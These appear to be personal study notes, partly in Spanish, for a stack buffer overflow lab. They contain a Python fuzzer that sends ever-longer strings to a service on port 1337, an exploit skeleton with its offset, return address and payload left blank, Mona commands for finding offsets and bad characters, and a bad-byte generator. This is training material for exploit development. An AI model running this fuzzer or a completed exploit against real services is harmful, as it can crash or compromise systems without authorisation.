# Scripts

fuzzer.py

```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.102.208"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

exploit.py

```
import socket

ip = "10.10.102.208"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

# Mona

```
# Comparar distancia
!mona findmsp -distance 600

# Encontrar malos personajes
!mona bytearray -b "\x00"


```


Generar cadena de carácteres incorrectos con Pyhon:

```
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```